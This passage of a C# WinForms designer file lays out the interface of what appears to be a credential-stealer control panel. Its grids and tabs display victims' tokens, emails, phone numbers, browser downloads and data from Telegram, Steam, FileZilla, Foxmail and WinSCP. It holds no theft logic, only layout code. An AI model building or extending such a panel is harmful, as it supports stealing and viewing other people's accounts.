            this.StealerDownloadsDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerDownloadsDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerDownloadsDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle32.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle32.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle32.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle32.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle32.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle32.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle32.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerDownloadsDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle32;
            this.StealerDownloadsDataGridView.ColumnHeadersHeight = 20;
            this.StealerDownloadsDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn39,
            this.dataGridViewTextBoxColumn40,
            this.dataGridViewTextBoxColumn42,
            this.dataGridViewTextBoxColumn43});
            dataGridViewCellStyle33.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle33.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle33.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle33.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle33.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle33.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle33.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerDownloadsDataGridView.DefaultCellStyle = dataGridViewCellStyle33;
            this.StealerDownloadsDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerDownloadsDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerDownloadsDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerDownloadsDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerDownloadsDataGridView.Name = "StealerDownloadsDataGridView";
            this.StealerDownloadsDataGridView.ReadOnly = true;
            this.StealerDownloadsDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerDownloadsDataGridView.RowHeadersVisible = false;
            this.StealerDownloadsDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerDownloadsDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerDownloadsDataGridView.Size = new System.Drawing.Size(819, 95);
            this.StealerDownloadsDataGridView.TabIndex = 5;
            this.StealerDownloadsDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerDownloadsDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerDownloadsDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerDownloadsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerDownloadsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerDownloadsDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerDownloadsDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerDownloadsDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerDownloadsDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerDownloadsDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerDownloadsDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerDownloadsDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerDownloadsDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerDownloadsDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerDownloadsDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerDownloadsDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerDownloadsDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerDownloadsDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerDownloadsDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerDownloadsDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerDownloadsDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn39
            // 
            this.dataGridViewTextBoxColumn39.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn39.HeaderText = "Client";
            this.dataGridViewTextBoxColumn39.Name = "dataGridViewTextBoxColumn39";
            this.dataGridViewTextBoxColumn39.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn40
            // 
            this.dataGridViewTextBoxColumn40.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn40.HeaderText = "Browser/Profile";
            this.dataGridViewTextBoxColumn40.Name = "dataGridViewTextBoxColumn40";
            this.dataGridViewTextBoxColumn40.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn42
            // 
            this.dataGridViewTextBoxColumn42.FillWeight = 20F;
            this.dataGridViewTextBoxColumn42.HeaderText = "Path";
            this.dataGridViewTextBoxColumn42.Name = "dataGridViewTextBoxColumn42";
            this.dataGridViewTextBoxColumn42.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn43
            // 
            this.dataGridViewTextBoxColumn43.FillWeight = 30F;
            this.dataGridViewTextBoxColumn43.HeaderText = "URL";
            this.dataGridViewTextBoxColumn43.Name = "dataGridViewTextBoxColumn43";
            this.dataGridViewTextBoxColumn43.ReadOnly = true;
            // 
            // AppsPage
            // 
            this.AppsPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.AppsPage.Controls.Add(this.StealerAppsTabControl);
            this.AppsPage.Flags = 65534;
            this.AppsPage.ImageSmall = global::InvokedServer.Properties.Resources.application2;
            this.AppsPage.LastVisibleSet = true;
            this.AppsPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.AppsPage.Name = "AppsPage";
            this.AppsPage.Size = new System.Drawing.Size(710, 215);
            this.AppsPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.AppsPage.Text = "Apps";
            this.AppsPage.ToolTipTitle = "Page ToolTip";
            this.AppsPage.UniqueName = "A7874AD2CFC943A47081F0E149168151";
            // 
            // StealerAppsTabControl
            // 
            this.StealerAppsTabControl.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.StealerAppsTabControl.Controls.Add(this.TokensPage);
            this.StealerAppsTabControl.Controls.Add(this.TelegramPage);
            this.StealerAppsTabControl.Controls.Add(this.SteamPage);
            this.StealerAppsTabControl.Controls.Add(this.ObsPage);
            this.StealerAppsTabControl.Controls.Add(this.NgrokPage);
            this.StealerAppsTabControl.Controls.Add(this.FilaZillaPage);
            this.StealerAppsTabControl.Controls.Add(this.FoxmailPage);
            this.StealerAppsTabControl.Controls.Add(this.WinscpPage);
            this.StealerAppsTabControl.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerAppsTabControl.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerAppsTabControl.ImageList = this.imageTabs;
            this.StealerAppsTabControl.ItemSize = new System.Drawing.Size(135, 25);
            this.StealerAppsTabControl.Location = new System.Drawing.Point(0, 0);
            this.StealerAppsTabControl.Name = "StealerAppsTabControl";
            this.StealerAppsTabControl.SelectedIndex = 0;
            this.StealerAppsTabControl.Size = new System.Drawing.Size(710, 215);
            this.StealerAppsTabControl.TabButtonHoverState.BorderColor = System.Drawing.Color.Empty;
            this.StealerAppsTabControl.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(52)))), ((int)(((byte)(70)))));
            this.StealerAppsTabControl.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.StealerAppsTabControl.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
            this.StealerAppsTabControl.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(52)))), ((int)(((byte)(70)))));
            this.StealerAppsTabControl.TabButtonIdleState.BorderColor = System.Drawing.Color.Empty;
            this.StealerAppsTabControl.TabButtonIdleState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerAppsTabControl.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.StealerAppsTabControl.TabButtonIdleState.ForeColor = System.Drawing.Color.White;
            this.StealerAppsTabControl.TabButtonIdleState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(42)))), ((int)(((byte)(60)))));
            this.StealerAppsTabControl.TabButtonImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.StealerAppsTabControl.TabButtonSelectedState.BorderColor = System.Drawing.Color.Empty;
            this.StealerAppsTabControl.TabButtonSelectedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(52)))), ((int)(((byte)(70)))));
            this.StealerAppsTabControl.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.StealerAppsTabControl.TabButtonSelectedState.ForeColor = System.Drawing.Color.White;
            this.StealerAppsTabControl.TabButtonSelectedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(120)))), ((int)(((byte)(150)))));
            this.StealerAppsTabControl.TabButtonSize = new System.Drawing.Size(135, 25);
            this.StealerAppsTabControl.TabButtonTextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.StealerAppsTabControl.TabIndex = 11;
            this.StealerAppsTabControl.TabMenuBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            // 
            // TokensPage
            // 
            this.TokensPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.TokensPage.Controls.Add(this.StealerTokensDataGridView);
            this.TokensPage.ForeColor = System.Drawing.Color.White;
            this.TokensPage.ImageIndex = 8;
            this.TokensPage.Location = new System.Drawing.Point(139, 4);
            this.TokensPage.Name = "TokensPage";
            this.TokensPage.Size = new System.Drawing.Size(567, 207);
            this.TokensPage.TabIndex = 8;
            this.TokensPage.Text = "Tokens";
            // 
            // StealerTokensDataGridView
            // 
            this.StealerTokensDataGridView.AllowUserToAddRows = false;
            this.StealerTokensDataGridView.AllowUserToDeleteRows = false;
            this.StealerTokensDataGridView.AllowUserToOrderColumns = true;
            this.StealerTokensDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle34.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle34.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle34.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle34.SelectionForeColor = System.Drawing.Color.White;
            this.StealerTokensDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle34;
            this.StealerTokensDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerTokensDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerTokensDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle35.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle35.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle35.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle35.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle35.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle35.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle35.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerTokensDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle35;
            this.StealerTokensDataGridView.ColumnHeadersHeight = 20;
            this.StealerTokensDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn24,
            this.dataGridViewTextBoxColumn25,
            this.dataGridViewTextBoxColumn26,
            this.Column5,
            this.Column6,
            this.Column7,
            this.dataGridViewTextBoxColumn27});
            dataGridViewCellStyle36.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle36.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle36.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle36.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle36.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle36.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle36.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerTokensDataGridView.DefaultCellStyle = dataGridViewCellStyle36;
            this.StealerTokensDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerTokensDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerTokensDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerTokensDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerTokensDataGridView.Name = "StealerTokensDataGridView";
            this.StealerTokensDataGridView.ReadOnly = true;
            this.StealerTokensDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerTokensDataGridView.RowHeadersVisible = false;
            this.StealerTokensDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerTokensDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerTokensDataGridView.Size = new System.Drawing.Size(567, 207);
            this.StealerTokensDataGridView.TabIndex = 4;
            this.StealerTokensDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerTokensDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerTokensDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerTokensDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerTokensDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerTokensDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerTokensDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerTokensDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerTokensDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerTokensDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerTokensDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerTokensDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerTokensDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerTokensDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerTokensDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerTokensDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerTokensDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerTokensDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerTokensDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerTokensDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerTokensDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn24
            // 
            this.dataGridViewTextBoxColumn24.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn24.HeaderText = "Client";
            this.dataGridViewTextBoxColumn24.Name = "dataGridViewTextBoxColumn24";
            this.dataGridViewTextBoxColumn24.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn25
            // 
            this.dataGridViewTextBoxColumn25.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn25.HeaderText = "ID";
            this.dataGridViewTextBoxColumn25.Name = "dataGridViewTextBoxColumn25";
            this.dataGridViewTextBoxColumn25.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn26
            // 
            this.dataGridViewTextBoxColumn26.FillWeight = 11F;
            this.dataGridViewTextBoxColumn26.HeaderText = "Username";
            this.dataGridViewTextBoxColumn26.Name = "dataGridViewTextBoxColumn26";
            this.dataGridViewTextBoxColumn26.ReadOnly = true;
            // 
            // Column5
            // 
            this.Column5.FillWeight = 6F;
            this.Column5.HeaderText = "Nitro";
            this.Column5.Name = "Column5";
            this.Column5.ReadOnly = true;
            // 
            // Column6
            // 
            this.Column6.FillWeight = 25F;
            this.Column6.HeaderText = "Email";
            this.Column6.Name = "Column6";
            this.Column6.ReadOnly = true;
            // 
            // Column7
            // 
            this.Column7.FillWeight = 12F;
            this.Column7.HeaderText = "Phone Number";
            this.Column7.Name = "Column7";
            this.Column7.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn27
            // 
            this.dataGridViewTextBoxColumn27.FillWeight = 35F;
            this.dataGridViewTextBoxColumn27.HeaderText = "Token";
            this.dataGridViewTextBoxColumn27.Name = "dataGridViewTextBoxColumn27";
            this.dataGridViewTextBoxColumn27.ReadOnly = true;
            // 
            // TelegramPage
            // 
            this.TelegramPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.TelegramPage.Controls.Add(this.guna2DataGridView1);
            this.TelegramPage.ImageIndex = 20;
            this.TelegramPage.Location = new System.Drawing.Point(139, 4);
            this.TelegramPage.Name = "TelegramPage";
            this.TelegramPage.Size = new System.Drawing.Size(567, 207);
            this.TelegramPage.TabIndex = 9;
            this.TelegramPage.Text = "Telegram";
            // 
            // guna2DataGridView1
            // 
            this.guna2DataGridView1.AllowUserToAddRows = false;
            this.guna2DataGridView1.AllowUserToDeleteRows = false;
            this.guna2DataGridView1.AllowUserToOrderColumns = true;
            this.guna2DataGridView1.AllowUserToResizeColumns = false;
            dataGridViewCellStyle37.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle37.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle37.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle37.SelectionForeColor = System.Drawing.Color.White;
            this.guna2DataGridView1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle37;
            this.guna2DataGridView1.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.guna2DataGridView1.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2DataGridView1.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle38.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle38.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle38.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle38.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle38.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle38.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle38.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle38;
            this.guna2DataGridView1.ColumnHeadersHeight = 20;
            this.guna2DataGridView1.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn4,
            this.dataGridViewTextBoxColumn8,
            this.dataGridViewTextBoxColumn12});
            dataGridViewCellStyle39.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle39.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle39.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle39.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle39.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle39.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle39.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView1.DefaultCellStyle = dataGridViewCellStyle39;
            this.guna2DataGridView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2DataGridView1.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.guna2DataGridView1.GridColor = System.Drawing.Color.Black;
            this.guna2DataGridView1.Location = new System.Drawing.Point(0, 0);
            this.guna2DataGridView1.Name = "guna2DataGridView1";
            this.guna2DataGridView1.ReadOnly = true;
            this.guna2DataGridView1.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.guna2DataGridView1.RowHeadersVisible = false;
            this.guna2DataGridView1.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.guna2DataGridView1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.guna2DataGridView1.Size = new System.Drawing.Size(567, 207);
            this.guna2DataGridView1.TabIndex = 5;
            this.guna2DataGridView1.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2DataGridView1.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.guna2DataGridView1.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.guna2DataGridView1.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.guna2DataGridView1.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.guna2DataGridView1.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2DataGridView1.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.guna2DataGridView1.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2DataGridView1.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.guna2DataGridView1.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView1.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.guna2DataGridView1.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.guna2DataGridView1.ThemeStyle.HeaderStyle.Height = 20;
            this.guna2DataGridView1.ThemeStyle.ReadOnly = true;
            this.guna2DataGridView1.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2DataGridView1.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.guna2DataGridView1.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView1.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.guna2DataGridView1.ThemeStyle.RowsStyle.Height = 22;
            this.guna2DataGridView1.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.guna2DataGridView1.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn4
            // 
            this.dataGridViewTextBoxColumn4.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn4.HeaderText = "Client";
            this.dataGridViewTextBoxColumn4.Name = "dataGridViewTextBoxColumn4";
            this.dataGridViewTextBoxColumn4.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn8
            // 
            this.dataGridViewTextBoxColumn8.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn8.HeaderText = "Root Path";
            this.dataGridViewTextBoxColumn8.Name = "dataGridViewTextBoxColumn8";
            this.dataGridViewTextBoxColumn8.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn12
            // 
            this.dataGridViewTextBoxColumn12.FillWeight = 11F;
